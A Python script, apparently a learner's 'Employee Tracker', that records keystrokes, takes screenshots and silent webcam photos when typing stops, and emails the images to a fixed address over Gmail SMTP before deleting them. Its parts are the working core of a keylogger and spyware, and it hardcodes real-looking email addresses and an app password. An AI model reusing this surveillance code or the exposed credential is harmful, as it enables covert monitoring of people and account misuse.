import time
import pyautogui
from pynput import keyboard
import logging
import sys
import cv2
from datetime import datetime
from plyer import notification
import glob
# for mail (
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import os
#             )
# msro wbhk knwh plez

# Set up logging                  (store keys in file)
# logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

countdown_time = 10  # Set the countdown time
reset_countdown = True  # Flag to reset the countdown
stop_countdown = False  # Flag to stop the countdown



def send_email_with_images(sender_email, receiver_email, subject, body, folder_path, password):
    # List to store valid image filenames
    image_files = []

    # Collect all .png and .jpg files from the specified folder
    for file in os.listdir(folder_path):
        if file.lower().endswith('.png') or file.lower().endswith('.jpg'):
            image_files.append(file)

    # Check if there are no valid images
    if not image_files:
        print("Error: No .png or .jpg files found in the specified folder.")
        return  # Exit if no valid images are found

    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Attach the email body
    msg.attach(MIMEText(body, 'plain'))

    # Attach the images
    for image_filename in image_files:
        image_path = os.path.join(folder_path, image_filename)
        try:
            with open(image_path, 'rb') as img:
                img_data = img.read()
                image = MIMEImage(img_data, name=os.path.basename(image_path))
                msg.attach(image)
        except FileNotFoundError:
            print(f"Image file not found: {image_path}")

    # Send the email
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS
            server.login(sender_email, password)  # Login with sender's email and password
            server.send_message(msg)
            print("Email sent successfully!")

            # delete file from folder-----------

            # folder_path = "C:/Users/TechNo/Desktop/python_course/part_5"

            # Use glob to find all .png files in the folder
            png_files = glob.glob(os.path.join(folder_path, "*.png")) + \
                        glob.glob(os.path.join(folder_path, "*.jpg"))

            # Loop through the files and delete them
            for files in png_files:
                try:
                    os.remove(files)
                    print(f"Deleted: {files}")
                except Exception as e:
                    print(f"Error deleting {files}: {e}")

                    print("All .png files have been deleted.")

    except Exception as e:
        print(f"Failed to send email: {e}")


def take_screenshot():
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")  
    filename = f"screenshot_{timestamp}.png"        
    screenshot = pyautogui.screenshot()             
    screenshot.save(filename)                       
    print(f"Screenshot saved as {filename}")


def capture_photo_silently():
    """Silently capture a photo from the camera and save it as a JPEG file."""
    # Initialize the camera
    capture = cv2.VideoCapture(0)

    if not capture.isOpened():
        print("Error: Unable to access the camera.")
        sys.exit(1)

    # Capture a frame
    ret, frame = capture.read()
    if ret:
        # Generate a filename with a timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"photo_{timestamp}.jpg"

        # Save the frame as a JPG file
        cv2.imwrite(filename, frame)
        print(f"Saved {filename}")
    else:
        print("Error: Could not capture frame.")

    # Release the camera
    capture.release()

def on_press(key):
    global reset_countdown, stop_countdown
    if key == keyboard.Key.esc:  # Check if Esc is pressed
        stop_countdown = True  # Set the flag to stop countdown
        return False  # Stop the listener
    reset_countdown = True  # Reset the countdown on any other key press

    # Check if the key pressed is a special key or a character key
    if hasattr(key, 'char') and key.char is not None:  # Regular character key
        logging.info(f'Key {key.char} pressed')
        print(f'Key {key.char} pressed')  # Debugging output
    else:  # Special key
        logging.info(f'{key} pressed')
        print(f'{key} pressed') 


def countdown(seconds):
    global reset_countdown, stop_countdown
    while seconds and not stop_countdown:  # Check if we need to stop the countdown
        mins, secs = divmod(seconds, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")  # Print the timer on the same line
        time.sleep(1)  # Wait for one second
        seconds -= 1
        
        if reset_countdown:  # Reset countdown if any key is pressed
            seconds = countdown_time
            reset_countdown = False  # Reset the flag

    if not stop_countdown:
        print("Time's up!")

        notification.notify(
            title = '⚠️warning!',
            message = '⚠️You are being record, Focus on your work.',
            app_name = 'Employee Tracker',
            timeout = 4
        )

        take_screenshot()

        capture_photo_silently()

    else:
        print("Countdown stopped.")  # Message when countdown is stopped
        exit()

print("Press any key to reset the countdown or Esc to exit...")  
listener = keyboard.Listener(on_press=on_press)
listener.start()  # Start the listener

count_repeat = 0
while True:
    countdown(countdown_time)
    count_repeat += 1

    if count_repeat % 5 == 0:
        print(f"Cycle repeat {count_repeat} times")
        notification.notify(
            title = '⚠️Warning!',
            message = '⚠️ You are under surveillance. Stop wasting time and focus on your work—NOW.',
            app_name = 'Employee Tracker',
            timeout = 15
        )

        if __name__ == "__main__":
            # Email configuration
            sender_email = "hashiir403@gmail.com"  # Replace with your email
            receiver_email = "hashirashfaq403@gmail.com"  # Replace with recipient email
            subject = "Employee tracker Update"
            body = "This employee is not working."

            # Path to the folder where the images are located
            folder_path = "C:/Users/TechNo/Desktop/python_course/part_5"  # Replace with the actual path
            password = "msro wbhk knwh plez"  # Replace with your password or app password

            send_email_with_images(sender_email, receiver_email, subject, body, folder_path, password)


        time.sleep(20)    

# Stop the listener after the countdown
# listener.stop()